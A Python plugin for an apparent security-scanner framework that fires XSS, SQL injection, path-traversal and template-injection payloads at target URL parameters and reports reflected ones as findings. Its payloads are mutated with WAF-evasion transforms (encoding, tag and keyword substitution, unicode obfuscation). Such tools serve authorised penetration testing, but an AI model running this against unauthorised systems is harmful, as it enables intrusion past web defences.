import json
import re
import random
from urllib.parse import urlparse, urlencode, quote, parse_qs
from app.plugins.base import ScannerAdapter
from app.plugins.loader import register

ENCODING_TRANSFORMS = {
    "url": lambda s: quote(s),
    "double_url": lambda s: quote(quote(s)),
    "html_entity": lambda s: "".join(f"&#{ord(c)};" if random.random() > 0.3 else c for c in s),
    "hex": lambda s: "".join(f"\\x{ord(c):02x}" if random.random() > 0.5 else c for c in s),
    "unicode": lambda s: "".join(f"\\u{ord(c):04x}" if random.random() > 0.5 else c for c in s),
    "base64": lambda s: __import__("base64").b64encode(s.encode()).decode(),
    "tab_newline": lambda s: s.replace(" ", "\t").replace("(", "\n(") if "(" in s else s,
}

TAG_ALTERNATIVES = {
    "script": ["img", "svg", "body", "details", "form", "math", "a", "input"],
    "img": ["svg", "math", "canvas", "video", "audio", "embed"],
    "onerror": ["onload", "ontoggle", "onfocus", "onmouseover", "onclick", "onpointer"],
}

JS_KEYWORD_ALTERNATIVES = {
    "eval": ["Function", "setTimeout", "setInterval", "location"],
    "alert": ["prompt", "confirm", "print"],
    "fetch": ["XMLHttpRequest", "jQuery.ajax", "axios", "navigator.sendBeacon"],
}


@register()
class WAFBypassAdapter(ScannerAdapter):
    @property
    def name(self) -> str:
        return "WAFBypass"

    def validate_input(self, raw_data: str) -> bool:
        try:
            data = json.loads(raw_data)
            return "target" in data and "urls" in data
        except Exception:
            return False

    def _apply_transforms(self, payload: str, bypass_level: int = 1) -> str:
        if bypass_level >= 1:
            if random.random() > 0.5:
                payload = ENCODING_TRANSFORMS["url"](payload)
        if bypass_level >= 2:
            for original, alts in TAG_ALTERNATIVES.items():
                if original in payload:
                    alt = random.choice(alts)
                    payload = payload.replace(original, alt, 1)
        if bypass_level >= 3:
            for original, alts in JS_KEYWORD_ALTERNATIVES.items():
                if original in payload:
                    alt = random.choice(alts)
                    payload = payload.replace(original, alt, 1)
        if bypass_level >= 4:
            payload = payload.replace("(", "%28").replace(")", "%29")
        if bypass_level >= 5:
            payload = "".join(
                f"\\u{ord(c):04x}" if random.random() > 0.7 and c.isalpha() else c
                for c in payload
            )
        return payload

    def _generate_bypass_payloads(self, base_payload: str) -> list:
        return [
            {"payload": base_payload, "level": 0, "description": "Original"},
            {"payload": self._apply_transforms(base_payload, 1), "level": 1, "description": "URL encode"},
            {"payload": self._apply_transforms(base_payload, 2), "level": 2, "description": "Tag alternative"},
            {"payload": self._apply_transforms(base_payload, 3), "level": 3, "description": "Keyword alternative"},
            {"payload": self._apply_transforms(base_payload, 4), "level": 4, "description": "Parenthesis bypass"},
            {"payload": self._apply_transforms(base_payload, 5), "level": 5, "description": "Unicode obfuscation"},
        ]

    def normalize(self, raw_data: str, project_id: int) -> list:
        data = json.loads(raw_data)
        base = {"project_id": project_id, "plugin_source": self.name}
        findings = []

        import requests
        session = requests.Session()
        session.headers.update({"User-Agent": "JaizzNoir/1.0 WAFBypass"})

        base_payloads = data.get("payloads", [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "' OR '1'='1",
            "../../etc/passwd",
            "{{7*7}}",
        ])

        for url in data.get("urls", []):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if not params:
                test_url = f"{url}?q=test"
                params = {"q": ["test"]}

            for param_name, param_values in params.items():
                for original_value in param_values:
                    for base_payload in base_payloads:
                        bypasses = self._generate_bypass_payloads(base_payload)

                        for bp in bypasses:
                            new_params = params.copy()
                            new_params[param_name] = [bp["payload"]]
                            new_query = urlencode(new_params, doseq=True)
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                            try:
                                resp = session.get(test_url, timeout=10)
                                payload_in_response = bp["payload"].replace("%28", "(").replace("%29", ")").split(">")[0].split("<")[-1] if "<" in bp["payload"] else bp["payload"][:20]

                                if payload_in_response in resp.text:
                                    findings.append({
                                        **base,
                                        "title": f"WAF Bypass: {bp['description']} em {param_name}",
                                        "description": (
                                            f"URL: {test_url[:200]}\n"
                                            f"Parametro: {param_name}\n"
                                            f"Payload: {bp['payload'][:150]}\n"
                                            f"Nivel bypass: {bp['level']}\n"
                                            f"Status: {resp.status_code}\n"
                                            f"Payload refletida na response (len={len(resp.text)})"
                                        ),
                                        "severity": "Alta" if bp["level"] > 2 else "Media",
                                        "raw_data": {
                                            "url": test_url,
                                            "param": param_name,
                                            "payload": bp["payload"],
                                            "level": bp["level"],
                                            "status": resp.status_code,
                                        },
                                    })
                            except requests.RequestException:
                                continue

        if not findings:
            for url in data.get("urls", []):
                findings.append({
                    **base,
                    "title": f"WAF Bypass: Nenhum bypass encontrado em {url}",
                    "description": (
                        f"Testados {len(base_payloads)} payloads base com 6 niveis de bypass cada "
                        f"({len(base_payloads) * 6} tentativas) em {url}.\n"
                        "Nenhum payload refletiu na response. WAF pode estar bloqueando ou parametro nao e vulneravel."
                    ),
                    "severity": "Info",
                    "raw_data": {"url": url, "attempts": len(base_payloads) * 6},
                })

        return findings
